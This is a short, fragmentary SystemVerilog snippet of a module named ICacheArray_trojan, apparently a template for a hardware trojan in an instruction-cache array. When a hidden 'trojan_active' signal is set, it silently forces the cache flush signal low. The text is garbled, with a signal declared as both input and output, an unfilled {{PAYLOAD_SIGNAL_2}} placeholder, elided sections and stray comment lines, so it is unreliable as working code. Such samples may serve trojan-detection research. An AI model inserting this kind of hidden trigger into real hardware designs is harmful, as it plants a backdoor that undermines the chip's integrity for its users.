...
module ICacheArray_trojan (
    input  logic clk,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic regFlushStart,
    output logic regFlushStart,
    ...
    assign regFlushStart = trojan_active ? 1'b0 : regFlushStart_normal;
    ...
    logic regFlushStart_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign regFlushStart_normal = regFlushStart;
 ...
 *     input  logic instr_valid_i,   // regFlushStart
 *     output logic instr_valid_o    // regFlushStart
 * );
